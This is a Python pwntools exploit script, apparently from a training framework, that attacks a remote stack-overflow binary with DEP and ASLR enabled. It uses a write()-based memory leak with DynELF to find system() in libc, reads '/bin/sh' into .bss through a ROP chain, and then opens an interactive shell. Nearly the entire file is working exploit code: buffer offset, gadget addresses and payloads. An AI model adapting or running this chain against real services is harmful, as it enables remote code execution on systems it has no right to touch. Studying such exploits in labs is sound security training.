#coding:UTF-8
'''StackOverflow - ROP_MemLeak (DEP - on, ALSR - on)'''

import sys
sys.path.append("..")
from pwn import *

class exploit(object):
    'exploit4'
    def __init__(self, options):
        self.options = options
        self.info = {
            'vulfun':0x08048404,
            'bss_addr':0x0804a018,
            'pppr':0x80484bd,
            'offset':140
            }
    def test(self):
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)

        libc = ELF('exploits/lib/libc.so.6')
        elf = ELF('../vulnerabilities/stack/vul2')

        plt_write = elf.symbols['write']
        plt_read = elf.symbols['read']

        vulfun_addr = self.info['vulfun']

        def leak(address):
            payload1 = 'A' * self.info['offset'] + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
            p.send(payload1)
            data = p.recv(4)
            print "%#x => %s" % (address, (data or '').encode('hex'))
            return data

        p = remote(ip, port)

        d = DynELF(leak, elf=ELF('../vulnerabilities/stack/vul2'))

        system_addr = d.lookup('system', 'libc')
        print "system_addr=" + hex(system_addr)

        bss_addr = self.info['bss_addr']
        pppr = self.info['pppr']

        payload2 = 'A' * self.info['offset']  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
        payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
        #ss = raw_input()

        print "\n###sending payload2 ...###"
        p.send(payload2)
        p.send("/bin/sh\0")

        p.interactive()











if __name__=='__main__':
    pass

